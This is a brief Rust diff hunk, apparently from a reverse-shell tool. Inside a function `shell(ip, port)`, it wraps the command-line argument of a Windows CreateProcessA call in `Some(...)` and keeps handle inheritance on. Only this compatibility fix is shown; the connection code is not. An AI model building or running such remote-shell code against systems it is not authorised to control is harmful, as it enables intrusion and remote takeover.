@@ -92,7 +92,7 @@ pub fn shell(ip: &str, port: u16) {
     let create_res = unsafe {
         CreateProcessA(
             PCSTR::null(),
-            lp_command_line,
+            Some(lp_command_line),
             Some(&SECURITY_ATTRIBUTES::default()),
             Some(&SECURITY_ATTRIBUTES::default()),
             true,
